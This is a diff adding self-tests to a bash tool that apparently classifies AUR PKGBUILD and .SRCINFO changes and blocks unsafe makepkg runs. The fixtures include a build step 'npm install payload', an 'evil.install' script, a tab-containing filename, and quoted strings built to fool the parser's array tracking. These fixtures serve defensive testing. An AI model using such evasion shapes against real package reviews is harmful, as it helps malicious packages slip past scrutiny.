+  printf -v _comment_vpgp_old_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsha256sums=(\n  '%s'\n) # checksums\nvalidpgpkeys=(\n  '0123456789ABCDEF0123456789ABCDEF01234567'\n)" "$_sum1"
+  printf -v _comment_vpgp_new_pkg "pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsha256sums=(\n  '%s'\n) # checksums\nvalidpgpkeys=(\n  '0123456789ABCDEF0123456789ABCDEF01234567'\n  'FEDCBA9876543210FEDCBA9876543210FEDCBA98'\n)" "$_sum1"
+  printf -v _inline_vpgp_old_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsha256sums=(\n  '%s')\nvalidpgpkeys=(\n  '0123456789ABCDEF0123456789ABCDEF01234567'\n)" "$_sum1"
+  printf -v _inline_vpgp_new_pkg "pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsha256sums=(\n  '%s')\nvalidpgpkeys=(\n  '0123456789ABCDEF0123456789ABCDEF01234567'\n  'FEDCBA9876543210FEDCBA9876543210FEDCBA98'\n)" "$_sum1"
+  printf -v _quoted_hash_old_pkg "pkgname=cls-pkg\npkgver=1.0\npkgrel=1\nsha256sums=(\n  '%s # literal') # checksums\nvalidpgpkeys=(\n  '0123456789ABCDEF0123456789ABCDEF01234567'\n)" "$_sum1"
+  printf -v _quoted_hash_new_pkg "pkgname=cls-pkg\npkgver=1.1\npkgrel=1\nsha256sums=(\n  '%s # literal') # checksums\nvalidpgpkeys=(\n  '0123456789ABCDEF0123456789ABCDEF01234567'\n  'FEDCBA9876543210FEDCBA9876543210FEDCBA98'\n)" "$_sum1"
+  _quoted_gadget_old_pkg=$'pkgname=cls-pkg\npkgver=1.0\npkgrel=1\n_dummy=\'\nsha256sums=(\n\'\nvalidpgpkeys=(\n  \'0123456789ABCDEF0123456789ABCDEF01234567\'\n)'
+  _quoted_gadget_new_pkg=$'pkgname=cls-pkg\npkgver=1.1\npkgrel=1\n_dummy=\'\nsha256sums=(\n\'\nvalidpgpkeys=(\n  \'0123456789ABCDEF0123456789ABCDEF01234567\'\n  \'FEDCBA9876543210FEDCBA9876543210FEDCBA98\'\n)'
   _old_vpgp_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tsource = https://example.com/pkg-1.tar\n\tsha256sums = '"$_sum1"$'\n\tvalidpgpkeys = 0123456789ABCDEF0123456789ABCDEF01234567\n\npkgname = cls-pkg'
   _new_vpgp_src=$'pkgbase = cls-pkg\n\tpkgver = 1.0\n\tpkgrel = 1\n\tsource = https://example.com/pkg-1.tar\n\tsha256sums = '"$_sum1"$'\n\tvalidpgpkeys = 0123456789ABCDEF0123456789ABCDEF01234567\n\tvalidpgpkeys = FEDCBA9876543210FEDCBA9876543210FEDCBA98\n\npkgname = cls-pkg'
   # Test fixture for .SRCINFO section-move (finding CR-major): depends=foo
@@ -2987,6 +3708,28 @@ cmd_selftest() {
     "$_old_basic" \
     "$_old_src" \
     "$_old_src"$'\n\tdepends = suspicious-aur-dep'
+
+  # PKGBUILD dependencies mirror .SRCINFO semantically, but are shell syntax:
+  # only literal single-quoted entries inside dependency arrays may inherit the
+  # installed/sync-db/intra-pkgbase trust decision. Expansion, unknown AUR
+  # dependencies, and a quoted token outside the array must remain reviewable.
+  tc_class pkgbuild-repo-dep boring 0 \
+    "$_old_dep_pkg" "$_new_repo_dep_pkg" "$_old_dep_src" "$_new_repo_dep_src"
+  tc_class pkgbuild-unknown-dep-review review 2 \
+    "$_old_dep_pkg" "$_new_aur_dep_pkg" "$_old_dep_src" "$_new_aur_dep_src"
+  tc_class pkgbuild-expansion-dep-review review 2 \
+    "$_old_dep_pkg" "$_new_expansion_dep_pkg" "$_old_dep_src" "$_new_repo_dep_src"
+  tc_class pkgbuild-stray-literal-review review 2 \
+    "$_old_stray_dep_pkg" "$_new_stray_dep_pkg" "$_old_dep_src" "$_new_repo_dep_src"
+  tc_class pkgbuild-safe-duplicate-cannot-mask-stray review 2 \
+    "$_old_dup_dep_pkg" "$_new_dup_dep_pkg" "$_old_dep_src" "$_new_dup_dep_src"
+  _class_bld "$_clx" cls-removed-opener-latch \
+    "$_old_dup_dep_pkg" "$_new_inline_stray_dep_pkg" "$_old_dep_src" "$_new_repo_dep_src"
+  if _pkgbuild_repo_dep_added_line "$_CLASS_DIR" "$_CLASS_BASE" "  'alsa-lib'"; then
+    log "  $(c_red "FAIL") classifier-removed-opener-cannot-latch"; fail=$((fail+1))
+  else
+    log "  $(c_green "PASS") classifier-removed-opener-cannot-latch"; pass=$((pass+1))
+  fi
 
   # PKGBUILD build-var assigned a bare git SHA (_commit=<hex>, optionally
   # quoted). Inert: the RHS of a string assignment is never executed; it just
@@ -3215,14 +3958,18 @@ cmd_selftest() {
     "$_new_vpgp_pkg" \
     "$_old_vpgp_src" \
     "$_new_vpgp_src"
+  tc_class checksum-comment-closer-cannot-latch review 2 \
+    "$_comment_vpgp_old_pkg" "$_comment_vpgp_new_pkg" "$_old_src" "$_new_src"
+  tc_class checksum-inline-closer-cannot-latch review 2 \
+    "$_inline_vpgp_old_pkg" "$_inline_vpgp_new_pkg" "$_old_src" "$_new_src"
+  tc_class checksum-quoted-hash-closer-cannot-latch review 2 \
+    "$_quoted_hash_old_pkg" "$_quoted_hash_new_pkg" "$_old_src" "$_new_src"
+  tc_class quoted-fake-opener-cannot-grant-context review 2 \
+    "$_quoted_gadget_old_pkg" "$_quoted_gadget_new_pkg" "$_old_src" "$_new_src"
 
-  # Regression: a checksum element changed DEEP in a multi-element array, where
-  # git splits the diff into separate hunks and emits the sha256sums=( opener
-  # ONLY in the @@ header label (not the hunk body). Before the fix,
-  # _pkgbuild_checksum_array_line reset in_cs on every @@ and never re-entered
-  # the array → the changed hex fell through to review (the nvidia-580xx-utils
-  # false positive). The gap between pkgver and the changed sum forces the
-  # 2-hunk split on git's default config.
+  # Regression: a checksum element changed deep enough that its diff hunk omits
+  # the array opener (the nvidia-580xx-utils shape). Complete-candidate parsing
+  # must still prove its context.
   _deep_pad=""
   for _ in $(seq 1 12); do _deep_pad+=$'# padding to force a 2-hunk split\n'; done
   printf -v _deep_cs_old_pkg 'pkgbase=cls-pkg\npkgver=1.0\n%ssource=("https://example.com/pkg.tar")\nsha256sums=(\n  %s\n  %s\n  %s\n  %s\n)' \
@@ -3237,10 +3984,8 @@ cmd_selftest() {
     "$_deep_cs_old_src" \
     "$_deep_cs_new_src"
 
-  # Same latent bug for optdepends: a deep entry change where git puts
-  # optdepends=( only in the @@ header label. pkgver also changes (above the
-  # padding) so git emits two hunks and the optdepends=( opener lands in the
-  # 2nd hunk's @@ label, not the body.
+  # Same deep/out-of-hunk regression for optdepends: complete-candidate parsing
+  # must find the opener even when the diff hunk body does not contain it.
   printf -v _deep_opt_old_pkg 'pkgbase=cls-pkg\npkgver=1.0\n%soptdepends=(\n  %s\n  %s\n  %s\n  %s\n)' \
     "$_deep_pad" "'dep1: one'" "'dep2: two'" "'dep3: three'" "'dep4: four'"
   printf -v _deep_opt_new_pkg 'pkgbase=cls-pkg\npkgver=2.0\n%soptdepends=(\n  %s\n  %s\n  %s\n  %s\n)' \
@@ -3328,6 +4073,10 @@ cmd_selftest() {
     "$_host_src"
   local _edge_dir="$_CLASS_DIR" _edge_base="$_CLASS_BASE" _edge_tip="$_CLASS_TIP" _edge_pkg="cls-multiline-source"
 
+  tc_class quoted-source-filename boring_edge 2 \
+    "$_quoted_source_old_pkg" "$_quoted_source_new_pkg" \
+    "$_quoted_source_old_src" "$_quoted_source_new_src"
+
   tc_class build-logic review 2 \
     "$_old_basic" \
     "$_old_basic"$'\nbuild() {\n  make\n}' \
@@ -3337,6 +4086,20 @@ cmd_selftest() {
     "$_old_basic" \
     "$_old_basic"$'\nbuild() { npm install payload; }' \
     "$_old_src" "$_old_src"
+
+  # NUL-delimited structural parsing: an attacker-controlled tab in a filename
+  # must still register as an added file, never split or disappear.
+  _class_bld "$_clx" cls-tab-filename "$_old_basic" "$_old_basic" "$_old_src" "$_old_src"
+  printf 'payload\n' >"$_CLASS_DIR/odd"$'\t'"name.install"
+  git -C "$_CLASS_DIR" add -A
+  git -C "$_CLASS_DIR" -c user.email=t@t -c user.name=t commit -qm tab-file
+  git -C "$_CLASS_DIR" update-ref refs/remotes/origin/master HEAD
+  classify_diff_rules cls-tab-filename "$_CLASS_DIR" "$_CLASS_BASE" >/dev/null 2>&1
+  if [ "$SCAN_DIFF_CLASS" = hard ]; then
+    log "  $(c_green "PASS") classifier-tab-install-hard"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") classifier-tab-install-hard (got $SCAN_DIFF_CLASS)"; fail=$((fail+1))
+  fi
 
   # PKGBUILD advisory-metadata array literal: license=('MIT') → license=('MIT'
   # 'LGPL-2.0-or-later'), the kilo-bin shape. Before Fix 1 this array form had
@@ -3417,7 +4180,7 @@ cmd_selftest() {
   _LLM_TEST_CALLS=0
   scan_diff_rules bad-ref "$_edge_dir" "0000000000000000000000000000000000000000" >/dev/null 2>&1
   _bad_rc=$?
-  if [ "$_bad_class" = audit_unavailable ] && [ "$_bad_rc" -eq 2 ] && [ "$_LLM_TEST_CALLS" -eq 0 ]; then
+  if [ "$_bad_class" = audit_unavailable ] && [ "$_bad_rc" -eq 1 ] && [ "$_LLM_TEST_CALLS" -eq 0 ]; then
     log "  $(c_green "PASS") classifier-audit-unavailable-no-llm"; pass=$((pass+1))
   else
     log "  $(c_red "FAIL") classifier-audit-unavailable-no-llm"
@@ -3482,6 +4245,54 @@ cmd_selftest() {
   AUR_URL="$_osr"; STATE_DIR="$_osd2"; STAGED_DIR="$_ost2"; MANIFEST_FILE="$_omf2"
   rm -rf "$_fbx" "$_fsd"
 
+  # --- exact pre-makepkg SHA guard (Finding S) -----------------------------
+  log ""
+  log "  $(c_dim "-- makepkg exact-SHA guard --")"
+  local _mg_root _mg_repo _mg_state _mg_sha _mg_marker
+  local _mg_sd="$STATE_DIR" _mg_ad="$ACCEPTED_DIR" _mg_st="$STAGED_DIR" _mg_mf="$MANIFEST_FILE"
+  _mg_root=$(mktemp -d); _mg_repo="$_mg_root/guard-pkg"; _mg_state="$_mg_root/state"
+  mkdir -p "$_mg_repo" "$_mg_state/accepted" "$_mg_state/staged"
+  ( cd "$_mg_repo" || exit 1
+    git -c init.defaultBranch=master init -q
+    git config user.email t@t; git config user.name t
+    printf 'pkgname=guard-pkg\npkgver=1\npkgrel=1\n' >PKGBUILD
+    printf 'pkgbase = guard-pkg\n\tpkgver = 1\n\tpkgrel = 1\n\npkgname = guard-pkg\n' >.SRCINFO
+    git add -A; git commit -qm base )
+  _mg_sha=$(git -C "$_mg_repo" rev-parse HEAD); _mg_marker="$_mg_root/makepkg-called"
+  STATE_DIR="$_mg_state"; ACCEPTED_DIR="$_mg_state/accepted"; STAGED_DIR="$_mg_state/staged"; MANIFEST_FILE="$_mg_state/last-gate"
+  _atomic_write_record "$STAGED_DIR/guard-pkg" "$_mg_sha"$'\t'"1970-01-01T00:00:00Z"$'\t'"file://$_mg_repo"
+  printf 'guard-pkg\n' >"$MANIFEST_FILE"
+  # shellcheck disable=SC2329  # test seam, invoked indirectly by cmd_makepkg
+  _exec_real_makepkg() { printf '%s\n' "$*" >"$_mg_marker"; return 0; }
+  # shellcheck disable=SC2329  # test helpers, invoked through ta
+  _mg_run() { ( cd "$_mg_repo" && AUR_SAFE_AS_MAKEPKG=1 AUR_SAFE_TRANSACTION_ACTIVE=1 cmd_makepkg "$@" ); }
+  # shellcheck disable=SC2329
+  _mg_no_tx() { ( cd "$_mg_repo" && AUR_SAFE_AS_MAKEPKG=1 AUR_SAFE_TRANSACTION_ACTIVE=0 cmd_makepkg "$@" ); }
+  ta "makepkg-guard-no-transaction-blocks" 1 _mg_no_tx
+  ta "makepkg-guard-repackage-blocks" 1 _mg_run --repackage
+  ta "makepkg-guard-context-switch-blocks" 1 _mg_run --dir /tmp
+  ta "makepkg-guard-matching-sha-runs" 0 _mg_run --syncdeps --noconfirm
+  if grep -q -- '--cleanbuild --force --syncdeps --noconfirm' "$_mg_marker" 2>/dev/null; then
+    log "  $(c_green "PASS") makepkg-guard-forces-fresh-artifact-and-preserves-args"; pass=$((pass+1))
+  else log "  $(c_red "FAIL") makepkg-guard-forces-fresh-artifact-and-preserves-args"; fail=$((fail+1)); fi
+
+  printf '# changed\n' >>"$_mg_repo/PKGBUILD"
+  ta "makepkg-guard-dirty-tracked-blocks" 1 _mg_run
+  git -C "$_mg_repo" checkout -q -- PKGBUILD
+  printf 'payload\n' >"$_mg_repo/evil.install"
+  ta "makepkg-guard-untracked-script-blocks" 1 _mg_run
+  rm -f "$_mg_repo/evil.install"
+  : >"$MANIFEST_FILE"
+  ta "makepkg-guard-unstaged-dependency-blocks" 1 _mg_run
+  printf 'guard-pkg\n' >"$MANIFEST_FILE"
+  printf 'pkgname=guard-pkg\npkgver=2\npkgrel=1\n' >"$_mg_repo/PKGBUILD"
+  git -C "$_mg_repo" add PKGBUILD; git -C "$_mg_repo" commit -qm newer
+  ta "makepkg-guard-window-commit-blocks" 1 _mg_run
+
+  unset -f _mg_run _mg_no_tx
+  STATE_DIR="$_mg_sd"; ACCEPTED_DIR="$_mg_ad"; STAGED_DIR="$_mg_st"; MANIFEST_FILE="$_mg_mf"
+  rm -rf "$_mg_root"
+
   log ""
   log "  $(c_bold "$pass passed, $fail failed")"
   exit $fail
@@ -3518,6 +4329,10 @@ EOF
 ###############################################################################
 # dispatch
 ###############################################################################
+if [[ "${AUR_SAFE_AS_MAKEPKG:-}" == 1 ]]; then
+  cmd_makepkg "$@"
+  exit $?
+fi
 [[ $# -eq 0 ]] && { usage; exit 3; }
 case "$1" in
   gate)     shift; cmd_gate "$@" ;;
